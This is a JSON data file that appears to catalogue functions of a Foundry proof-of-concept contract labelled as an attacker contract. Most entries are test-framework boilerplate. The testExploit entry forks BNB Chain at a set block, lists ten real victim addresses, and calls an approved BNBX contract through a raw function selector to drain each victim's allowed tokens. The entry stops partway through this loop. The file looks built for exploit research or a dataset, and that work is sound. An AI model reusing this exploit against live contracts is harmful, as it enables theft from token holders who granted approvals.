[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 38_230_509 - 1);\n        vm.label(address(BNBX), \"BNBX\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(BNBX_0x389a), \"BNBX_0x389a\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_uint(\"Attacker WBNB balance before attack\", WBNB.balanceOf(address(this)));\n        // 10 victims as an example\n        address[] memory victims = new address[](10);\n        victims[0] = 0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146;\n        victims[1] = 0xe497e225407b5a305F5e359973bebD4A1986CF7e;\n        victims[2] = 0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c;\n        victims[3] = 0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC;\n        victims[4] = 0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C;\n        victims[5] = 0xb53905E26CA1F0106107772C1f48e6D035B4E0F1;\n        victims[6] = 0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D;\n        victims[7] = 0x98C9440822B4A8F9A24E7ee34222E566F08c15E4;\n        victims[8] = 0x830a727B59477373Cf7bbB66fB4abf22afBBdF56;\n        victims[9] = 0x741b7870DBDCd8CceD6ae19bABA4Da814101484d;\n\n        for (uint256 i; i < victims.length; i++) {\n            uint256 allowance = BNBX.allowance(victims[i], address(BNBX_0x389a));\n            uint256 balance = BNBX.balanceOf(victims[i]);\n            uint256 available = balance <= allowance ? balance : allowance; // available USDT\n\n            if (available > 0) {\n                BNBX_0x389a.call(abi.encodeWithSelector(bytes4(0x11834d4c), victims[i]));\n            }\n",
    "description": ""
  }
]